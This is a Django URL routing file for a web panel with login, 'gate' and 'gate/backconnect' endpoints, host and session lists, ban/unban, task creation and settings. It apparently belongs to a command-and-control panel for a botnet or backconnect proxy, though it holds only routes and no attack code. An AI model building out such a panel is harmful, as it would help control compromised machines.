from django.urls import path
from .views import AdminPanel, Handlers, Subsidiary
from django.conf import settings
from django.conf.urls.static import static

sub = Subsidiary()
ap = AdminPanel(sub)
handlers = Handlers(sub)

urlpatterns = [
    path('login/', ap.get_login_page, name='login_page'),
    path('login-handler/', handlers.login_handler, name='login_handler'),
    path('', ap.get_main_page, name='main_page'),
    path('gate/', handlers.gate, name='gate'),
    path('table/', ap.get_table_page, name='table_page'),
    path('ban/', handlers.ban, name='ban'),
    path('unban/', handlers.unban, name='unban'),
    path('gate/backconnect/', handlers.backconnect, name='back_connect'),
    path('task/', ap.task, name='task'),
    path('admin-panel/', ap.admin_table, name='admin_table'),
    path('sessions/', ap.get_sessions_page, name='sessions_page'),
    path('stop-conn/', handlers.stop_conn, name='stop_conn'),
    path('logout/', handlers.logout, name='logout'),
    path('add-comment/', handlers.add_comment, name='add_comment'),
    path('test/', handlers.test, name='test'),
    path('hosts/', handlers.hosts, name='hosts'),
    path('create-task/', handlers.create_task, name='create_task'),
    path('settings/change-password/', ap.change_password, name='change_password'),
    path('change-password/', handlers.change_password, name='handler_change_password'),
    path('settings/', ap.get_settings_page, name='settings_page')
]
